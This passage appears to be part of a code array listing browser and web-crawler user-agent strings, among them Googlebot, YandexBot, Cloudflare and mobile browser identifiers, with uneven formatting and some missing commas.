			"Avant Browser/1.2.789rel1 (http://www.avantbrowser.com)",
                        "TelegramBot (like TwitterBot)"
                       "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36 TelegramBot (like TwitterBot)"
                        "Mozilla/5.0 (compatible; YandexAdNet/1.0; +http://yandex.com/bots)"
                        "Mozilla/5.0 (compatible; Cloudflare-Smart-Transit/1.0; +https://www.cloudflare.com/"
"Mozilla/5.0 (Linux; Android 5.0; SM-G920A) AppleWebKit (KHTML, like Gecko) Chrome Mobile Safari (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)"
                        "Googlebot/2.1 (+http://www.google.com/bot.html)"                        "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Pinterestbot/1.0; +http://www.pinterest.com/bot.html)"
                        "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B411 Safari/600.1.4 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
                        "Mozilla/5.0 (Slurp/cat; slurp@inktomi.com; http://www.inktomi.com/slurp.html)"
                        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/536.28.10 (KHTML, like Gecko) Version/6.0.3 Safari/536.28.10",
                        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:20.0) Gecko/20100101 Firefox/20.0",
                        "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
                        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36 (compatible; YandexScreenshotBot/3.0; +http://yandex.com/bots)"
                        "Mozilla/5.0 (compatible; Cloudflare-Smart-Transit/1.0; +https://www.cloudflare.com/",
"Mozilla/5.0 (compatible; CloudFlare-AlwaysOnline/1.0; +http://www.cloudflare.com/always-online) AppleWebKit/534.34",
 "Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)",
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.5 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.4",
 "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
   " Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
     "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)",
                        "Mozilla/5.0 (Linux; U; Android 5.1; zh-cn; Build/LMY47D ) AppleWebKit/534.30 (KHTML,like Gecko) Version/4.0 Chrome/50.0.0.0 Mobile Safari/534.30 GIONEE-GN9010/GN9010 RV/5.0.16",
                       "Mozilla/5.0 (compatible; Google-Site-Verification/1.0)",
                       "Dalvik/1.6.0 (Linux; U; Android 4.4.2; GT-I9190 Build/KOT49H)",
                       "Mozilla/5.0 (Linux; Android 4.4.2; DEXP Ixion ES2 4.5 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.131 YaBrowser/14.5.1847.18432.00 Mobile Safari/537.36",
                        "Mozilla/5.0 (Linux; U; Android 6.0; zh-cn; Build/MRA58K ) AppleWebKit/534.30 (KHTML,like Gecko) Version/4.0 Chrome/50.0.0.0 Mobile Safari/534.30 GIONEE-S9/S9 RV/5.0.17",
                        "VK/28 CFNetwork/711.4.6 Darwin/14.0.0",
                        "Instagram 8.2.0 (iPhone4,1; iPhone OS 8_4; ru_RU; ru; scale=2.00; 640x960)    AppleWebKit/420+",
                        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36",
                       "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)" 
                       "Mozilla/5.0 (compatible; vkShare; +vk.com/dev/Share)",
                       "Mozilla/5.0 (Windows Mobile 10; Android 8.0.0; Microsoft; Lumia 950XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36 Edge/80.0.361.62"  
                        "Mozilla/5.0 (Linux; Android 5.1.1) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Focus/2.3 Chrome/59.0.3071.125 Mobile Safari/537.36"
                        "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N)"
                        "Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.84 Safari/537.36 CrKey/1.21a.76178",
                        "Sogou head spider/3.0( http://www.sogou.com/docs/help/webmasters.htm#07)",
                        "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0"
                        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.99 Safari/537.36 Vivaldi/2.9.1705.41",
                         "Mozilla/5.0 (Linux; Android 9; STF-L09 Build/HUAWEISTF-L09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.79 Mobile Safari/537.36 [Pinterest/Android]",
                        "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone9,1;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBCR/Verizon]",
                        "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/13.3;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBCR/AT&T]",
                       "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36",
                       "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36",
                       "WeatherReport/1.2.1 CFNetwork/485.12.7 Darwin/10.4.0",
                       "WeatherReport/1.2.2 CFNetwork/485.12.7 Darwin/10.4.0",
                       "Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1",
                        "Mozilla/5.0 (Linux; Android 4.2.2; Philips S388 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Mobile Safari/537.36 OPR/34.0.2044.98679"
                        "Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com)"
                       "Googlebot/2.1 ( http://www.googlebot.com/bot.html)"
                       "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
                       "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36",
                       "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
                       "APIs-Google (+https://developers.google.com/webmasters/APIs-Google.html)"
                       "Mozilla/5.0 (Linux; Android 4.4; Nexus 5 Build/_BuildID_) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36"
                       "Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16"
                       "Mozilla/5.0 (Linux; U; Android 2.3.1; en-us; MID Build/GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
                       "Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; MID Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30 [FB_IAB/FB4A;FBAV/56.0.0.23.68;]",
                       "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.137 Safari/537.36 OPR/67.0.3575.79"
                       "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)"
"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
"DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)"
"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
"Mozilla/5.0 (compatible; Exabot/3.0; +http://www.exabot.com/go/robot)"
"Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.5 (like Gecko) (Exabot-Thumbnails"
"facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
"ia_archiver (+http://www.alexa.com/site/help/webmasters; crawler@alexa.com)"
                       "Mozilla/5.0 (Linux; Android 8.1.0; motorola one Build/OPKS28.63-18-3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 Instagram 72.0.0.21.98 Android (27/8.1.0; 320dpi; 720x1362; motorola; motorola one; deen_sprout; qcom; pt_BR; 132081645)"
                       "Googlebot/2.1 (+http://www.google.com/bot.html)"
                        "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"      
			"Baiduspider ( http://www.baidu.com/search/spider.htm)",
                        "Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/Robots/2.0; +http://go.mail.ru/help/robots)"
                        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051010 Firefox/1.0.7 (Ubuntu package 1.0.7)"
			"BlackBerry7100i/4.1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/103",
                 	"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/5.0.3.3 UP.Link/5.1.2.12 (Google WAP Proxy/1.0)",
			"BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0",
                        "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
		"Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
		"Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
		"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
		"Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
		"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
		"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
		"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
		"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
		"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1",
		"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
		"Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
		"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
		"Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016",
		"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10",
		"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7",
		"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18",
		"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10",
		"Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)",
		"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9",
		"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8",
		"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)",
		"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )",
		"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1",
		"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14",
		"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5",
		"Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre",
		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12",
		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.5",
		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5",
		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14",
		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20",
		"Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a",
		"Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2",
		"Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0",
		"Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34",
		"Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1",
		"Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2",
		"Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
		"Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
		"Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
		"Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 ",
		"Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
		"Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre",
		"Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0",
		"Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2",
		"Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0",
		"Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
		"Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre",
		"Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
		"Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2",
		"Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
		"Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre",
		"Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0",
		"Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1",
		"Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0",
		"Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8",
		"Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0",
		"Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15",
		"Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko",
		"Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16",
		"Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025",
		"Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1",
		"Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020",
		"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1",
		"Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)",
		"Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher",
		"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian",
		"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8",
			"BlackBerry8320/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/100",
           "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)"
    			"BlackBerry8330/4.3.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/105",
			"BlackBerry9000/4.6.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102",
			"BlackBerry9530/4.7.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102 UP.Link/6.3.1.20.0",
			"BlackBerry9700/5.0.0.351 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/123",
			"Bloglines/3.1 (http://www.bloglines.com)",
                        "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)"
"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)"
"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; InfoPath.1; SV1; .NET CLR 3.8.36217; WOW64; en-US)"
"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; .NET CLR 2.7.58687; SLCC2; Media Center PC 5.0; Zune 3.4; Tablet PC 3.6; InfoPath.3)"
 			"CSSCheck/1.2.2",    
			"Dillo/2.0",                                                                                                               
      			"DoCoMo/2.0 SH901iC(c100;TB;W24H12)",                                                                                                                                                         
			"Download Demon/3.5.0.11",
			"ELinks/0.12~pre5-4",
                        "11.50"
"PHP/7.1"
"Python-urllib/2.7"
"Rome"
"Tiny Tiny RSS/1.15.3 (http://tt-rss.org/)"
"Tiny Tiny RSS/17.12 (http://tt-rss.org/"
			"ELinks (0.4pre5; Linux 2.6.10-ac7 i686; 80x33)",
			"ELinks/0.9.3 (textmode; Linux 2.6.9-kanotix-8 i686; 127x41)",
			"EmailWolf 1.00",
	        	"everyfeed-spider/2.0 (http://www.everyfeed.com)",
			"facebookscraper/1.0( http://www.facebook.com/sharescraper_help.php)",
			"FAST-WebCrawler/3.8 (crawler at trd dot overture dot com; http://www.alltheweb.com/help/webmaster/crawler)",
			"FeedFetcher-Google; ( http://www.google.com/feedfetcher.html)",
			"Gaisbot/3.0 (robot@gais.cs.ccu.edu.tw; http://gais.cs.ccu.edu.tw/robot.php)",
    			"Googlebot/2.1 ( http://www.googlebot.com/bot.html)",
                        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
        "Opera/5.0 (Ubuntu; U; Windows NT 6.1; es; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13"
  "Opera/5.0 (SunOS 5.8 sun4u; U)  [en]"
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
	"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
	"Mozilla/5.0 (Windows NT 6.1; rv:13.0) Gecko/20100101 Firefox/13.0.1",
	"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
	"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
	"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
	"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
	"Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:13.0) Gecko/20100101 Firefox/13.0.1",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3",
	"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6",
	"Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
	"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11",
	"Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
	"Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02",
	"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0",
	"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
	"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 3.5.30729)",
	"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:13.0) Gecko/20100101 Firefox/13.0.1",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",
	"Mozilla/5.0 (Windows NT 6.1; rv:2.0b7pre) Gecko/20100921 Firefox/4.0b7pre",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
